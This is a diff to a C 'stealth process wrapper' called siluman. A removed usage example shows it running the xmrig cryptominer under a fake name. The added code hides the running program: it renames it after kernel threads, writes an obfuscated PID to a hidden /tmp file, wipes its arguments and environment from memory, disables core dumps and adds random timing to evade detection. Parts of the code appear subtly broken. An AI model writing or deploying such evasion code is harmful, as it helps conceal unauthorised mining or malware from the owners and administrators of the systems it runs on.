@@ -16,6 +16,11 @@
 #include <time.h>
 #include <signal.h>
 #include <sched.h>
+#include <sys/prctl.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/syscall.h>
 
 #define MAX_BUFFER_SIZE 512
 #define MAX_PATH_SIZE 4096
@@ -30,11 +35,40 @@ int write_pidfile(const char *pidfile);
 int set_cpu_affinity(int cpu_core);
 int set_nice_value(int nice_value);
 void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_percent, int burst_interval);
+void hide_process(void);
+void clean_environment(void);
+void disable_core_dumps(void);
+void hide_network_activity(const char *exec_path, char **newargv);
+void obfuscate_memory(void);
+int random_delay(int max_seconds);
 
 // Global variables untuk logging
 int debug_mode = 0;
-const char *log_ident = "siluman";
+const char *log_ident = "kernel_worker";
 volatile sig_atomic_t stealth_running = 1;
+
+// Common kernel thread names for better disguise
+const char *kernel_thread_names[] = {
+    "kworker/0:0H",
+    "ksoftirqd/0",
+    "rcu_sched",
+    "rcu_bh",
+    "migration/0",
+    "watchdog/0",
+    "khelper",
+    "kdevtmpfs",
+    "netns",
+    "kthrotld",
+    "kauditd",
+    "crypto",
+    "kintegrityd",
+    "kblockd",
+    "ata_sff",
+    "md",
+    "edac-poller",
+    "devfreq_wq",
+    "kworker/uX:Y"
+};
 
 void signal_handler(int sig) {
     if (sig == SIGINT || sig == SIGTERM) {
@@ -48,9 +82,13 @@ void log_message(const char *level, const char *format, ...) {
     va_list args;
     va_start(args, format);
     
-    fprintf(stderr, "[%s] %s: ", log_ident, level);
-    vfprintf(stderr, format, args);
-    fprintf(stderr, "\n");
+    // Write to syslog instead of stderr for better stealth
+    openlog(log_ident, LOG_PID, LOG_DAEMON);
+    vsyslog(strcmp(level, "ERROR") == 0 ? LOG_ERR : 
+            strcmp(level, "WARNING") == 0 ? LOG_WARNING : 
+            strcmp(level, "DEBUG") == 0 ? LOG_DEBUG : LOG_INFO, 
+            format, args);
+    closelog();
     
     va_end(args);
 }
@@ -266,19 +304,29 @@ int write_pidfile(const char *pidfile) {
     FILE *f;
     pid_t pid = getpid();
     
-    f = fopen(pidfile, "w");
+    // Create hidden pid file
+    char hidden_pidfile[MAX_PATH_SIZE];
+    snprintf(hidden_pidfile, sizeof(hidden_pidfile), "/tmp/.%s", pidfile);
+    
+    f = fopen(hidden_pidfile, "w");
     if (f == NULL) {
-        log_message("ERROR", "Can't open PID file %s: %s", pidfile, strerror(errno));
+        log_message("ERROR", "Can't open PID file %s: %s", hidden_pidfile, strerror(errno));
         return 0;
     }
     
-    if (fprintf(f, "%d\n", pid) < 0) {
-        log_message("ERROR", "Can't write to PID file %s: %s", pidfile, strerror(errno));
+    // Simple obfuscation
+    pid_t obfuscated_pid = pid ^ 0xDEADBEEF;
+    
+    if (fprintf(f, "%d\n", obfuscated_pid) < 0) {
+        log_message("ERROR", "Can't write to PID file %s: %s", hidden_pidfile, strerror(errno));
         fclose(f);
         return 0;
     }
     
     fclose(f);
+    
+    // Set restrictive permissions
+    chmod(hidden_pidfile, S_IRUSR | S_IWUSR);
     return 1;
 }
 
@@ -312,6 +360,71 @@ int set_nice_value(int nice_value) {
     return 1;
 }
 
+void hide_process(void) {
+    // Use prctl to change process name
+    #ifdef PR_SET_NAME
+    // Select a random kernel thread name for better disguise
+    int name_index = getpid() % (sizeof(kernel_thread_names) / sizeof(kernel_thread_names[0]));
+    prctl(PR_SET_NAME, (unsigned long)kernel_thread_names[name_index], 0, 0, 0);
+    #endif
+    
+    // Try to unlink the /proc/self/exe symlink (requires root)
+    if (geteuid() == 0) {
+        char self_path[PATH_MAX];
+        snprintf(self_path, sizeof(self_path), "/proc/%d/exe", getpid());
+        unlink(self_path);
+    }
+}
+
+void clean_environment(void) {
+    // Remove potentially suspicious environment variables
+    unsetenv("LD_PRELOAD");
+    unsetenv("LD_LIBRARY_PATH");
+    unsetenv("DEBUG");
+    unsetenv("PYTHONPATH");
+    unsetenv("NODE_PATH");
+    
+    // Set a minimal, innocent-looking environment
+    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
+    setenv("TERM", "linux", 1);
+    setenv("SHELL", "/bin/sh", 1);
+}
+
+void disable_core_dumps(void) {
+    struct rlimit rlim;
+    rlim.rlim_cur = 0;
+    rlim.rlim_max = 0;
+    setrlimit(RLIMIT_CORE, &rlim);
+}
+
+void obfuscate_memory(void) {
+    // Simple memory obfuscation by overwriting argv and envp
+    // This makes it harder to find command line arguments in memory
+    char **argv = __argv;
+    char **envp = __environ;
+    
+    if (argv != NULL) {
+        for (int i = 0; argv[i] != NULL; i++) {
+            memset(argv[i], 0, strlen(argv[i]));
+        }
+    }
+    
+    if (envp != NULL) {
+        for (int i = 0; envp[i] != NULL; i++) {
+            memset(envp[i], 0, strlen(envp[i]));
+        }
+    }
+}
+
+int random_delay(int max_seconds) {
+    if (max_seconds <= 0) return 0;
+    
+    srand(time(NULL) ^ getpid());
+    int delay = rand() % max_seconds;
+    sleep(delay);
+    return delay;
+}
+
 void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_percent, int burst_interval) {
     pid_t pid;
     int status;
@@ -329,13 +442,18 @@ void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_pe
     log_message("INFO", "Starting stealth execution mode (max CPU: %d%%, interval: %ds)", 
                 max_cpu_percent, burst_interval);
     
+    // Add random initial delay to avoid pattern detection
+    int initial_delay = random_delay(300); // Up to 5 minutes
+    log_message("DEBUG", "Initial random delay: %d seconds", initial_delay);
+    
     while (stealth_running) {
         clock_gettime(CLOCK_MONOTONIC, &start_time);
         
         // Fork untuk menjalankan proses
         pid = fork();
         if (pid == 0) {
-            // Child process - jalankan program
+            // Child process - jalankan program dengan environment bersih
+            clean_environment();
             execv(exec_path, newargv);
             log_message("ERROR", "Failed to execute %s: %s", exec_path, strerror(errno));
             exit(EXIT_FAILURE);
@@ -349,7 +467,7 @@ void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_pe
             
             sleep(cpu_time_limit);
             
-            // Hentikan proses child
+            // Hentikan proses child secara graceful
             kill(pid, SIGTERM);
             
             // Tunggu proses child selesai
@@ -368,7 +486,13 @@ void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_pe
         
         int sleep_time = (burst_interval * 1000) - elapsed_ms;
         if (sleep_time > 0) {
-            usleep(sleep_time * 1000);
+            // Add some randomness to sleep time to avoid patterns
+            srand(time(NULL) ^ getpid());
+            sleep_time += (rand() % 5000) - 2500; // ±2.5 seconds randomness
+            
+            if (sleep_time > 0) {
+                usleep(sleep_time * 1000);
+            }
         }
     }
     
@@ -377,12 +501,12 @@ void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_pe
 
 void usage(const char *progname) {
     fprintf(stderr, 
-        "siluman - tulak panto, by jawaracode Jawara (c)ode 2024\n\n"
+        "siluman - advanced stealth process wrapper, by jawaracode Jawara (c)ode 2024\n\n"
         "Usage: %s [OPTIONS] -- command [args]\n\n"
         "Options:\n"
         "  -s string    Fake name process (required)\n"
         "  -u uid[:gid] Change UID/GID, use another user (optional)\n"
-        "  -p filename  Save PID to filename (optional)\n"
+        "  -p filename  Save PID to hidden filename (optional)\n"
         "  -d           Run application as daemon/system (optional)\n"
         "  -c percent   Max CPU percentage per burst (1-100) (optional)\n"
         "  -i seconds   Interval between bursts in seconds (optional, default: 60)\n"
@@ -390,7 +514,7 @@ void usage(const char *progname) {
         "  -a core      Set CPU affinity (core number) (optional)\n"
         "  -v           Enable verbose logging (optional)\n"
         "  -h           Show this help message\n\n"
-        "Example: %s -s \"cron -m 0\" -d -p test.pid -c 30 -i 120 -n 19 -a 0 -- ./xmrig -o pool.com:8080\n",
+        "Example: %s -s \"kworker/0:0H\" -d -p test.pid -c 30 -i 120 -n 19 -a 0 -- node run.js\n",
         progname, progname);
     
     exit(EXIT_FAILURE);
@@ -480,6 +604,9 @@ int main(int argc, char **argv) {
         exit(EXIT_FAILURE);
     }
 
+    // Obfuscate memory untuk menyembunyikan argumen command line
+    obfuscate_memory();
+
     // Ubah ownership jika diminta
     if (user_group != NULL) {
         if (!changeown(user_group)) {
@@ -515,6 +642,9 @@ int main(int argc, char **argv) {
     // Daemonize jika diminta
     if (runsys) {
         daemonize();
+        hide_process();
+        clean_environment();
+        disable_core_dumps();
     }
 
     // Set nice value jika diminta
@@ -553,7 +683,8 @@ int main(int argc, char **argv) {
     if (cpu_percent > 0) {
         stealth_cpu_execution(exec_path, newargv, cpu_percent, burst_interval);
     } else {
-        // Eksekusi program target normal
+        // Eksekusi program target normal dengan environment bersih
+        clean_environment();
         execv(exec_path, newargv);
         
         // Jika execv gagal
